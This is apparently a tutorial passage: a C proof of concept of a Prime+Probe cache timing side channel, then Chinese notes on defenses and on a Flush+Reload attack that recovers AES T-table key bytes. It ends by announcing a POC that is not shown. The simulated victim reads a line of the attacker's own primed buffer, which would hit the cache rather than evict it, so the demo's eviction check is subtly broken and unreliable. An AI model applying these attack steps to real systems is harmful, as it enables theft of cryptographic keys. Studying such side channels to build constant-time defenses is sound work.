#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>

#define CACHE_SET_SIZE 64  // 假设每个缓存集有64字节（实际L1缓存行大小）
#define PRIME_COUNT 8      // 填充的缓存行数，确保覆盖整个缓存集

// 攻击者填充的缓冲区，每个元素间隔缓存行大小（64字节）
uint8_t prime_buffer[PRIME_COUNT * 64];

// 受害者函数（模拟）
void victim_function() {
    // 假设受害者访问某个地址，该地址映射到与prime_buffer相同的缓存集
    volatile uint8_t *addr = (volatile uint8_t *)(prime_buffer + 2 * 64);  // 故意访问prime_buffer中的一行
    volatile uint8_t tmp = *addr;
    (void)tmp;
}

// 测量访问时间
uint64_t measure_access(volatile void *addr) {
    uint64_t start, end;
    unsigned int aux;
    start = __rdtscp(&aux);
    volatile uint8_t tmp = *(volatile uint8_t *)addr;
    end = __rdtscp(&aux);
    return end - start;
}

int main() {
    // 步骤1: Prime - 填充缓存集
    for (int i = 0; i < PRIME_COUNT; i++) {
        volatile uint8_t tmp = prime_buffer[i * 64];
        (void)tmp;
    }
    _mm_mfence();

    // 步骤2: 等待受害者执行
    victim_function();

    // 步骤3: Probe - 重新加载并测量每个缓存行
    int evicted_count = 0;
    for (int i = 0; i < PRIME_COUNT; i++) {
        uint64_t time = measure_access(&prime_buffer[i * 64]);
        // 如果时间超过阈值（例如200周期），说明该行被驱逐
        if (time > 200) {
            evicted_count++;
            printf("Cache line %d evicted (time=%lu)\n", i, time);
        }
    }

    if (evicted_count > 0) {
        printf("Victim accessed a memory location in the same cache set.\n");
    } else {
        printf("No eviction detected.\n");
    }

    return 0;
}


**说明**：
- 实际攻击中，攻击者需要知道目标内存地址映射到哪个缓存集。这可以通过物理地址的缓存索引位计算（如`(phys_addr >> 6) & (cache_sets-1)`）。
- Prime+Probe比Flush+Reload更隐蔽，因为不需要共享内存，但需要更精确的缓存集映射知识。
- 防御方法包括：使用恒定时间代码（避免数据依赖的缓存访问）、禁用超线程（防止同核心攻击）、使用缓存分区（如Intel CAT技术）。

**Flush+Reload监控AES T-table**：AES加密实现中，常使用四个查找表（T-table）来加速字节代换、行移位和列混淆操作。这些表的大小为256个32位字，通常存储在连续内存中。由于表访问索引依赖于密钥和明文，攻击者可以通过Flush+Reload监控受害者对特定表项的访问，从而推断密钥。

攻击步骤：
1. **确定目标表项**：AES第一轮中，`T0[plaintext[0] ^ key[0]]`被访问。攻击者已知明文（或可控制），通过监控哪个表项被缓存，可以恢复密钥字节。
2. **Flush+Reload循环**：攻击者反复刷新所有表项，然后等待受害者加密一个已知明文，再重新加载每个表项，测量时间。缓存命中的表项对应`plaintext[i] ^ key[i]`，从而得到`key[i] = plaintext[i] ^ index`。
3. **逐字节恢复**：对每个字节重复，即可恢复完整密钥。

以下是一个C语言POC，模拟OpenSSL的AES加密（使用T-table），并演示Flush+Reload攻击恢复第一个密钥字节。

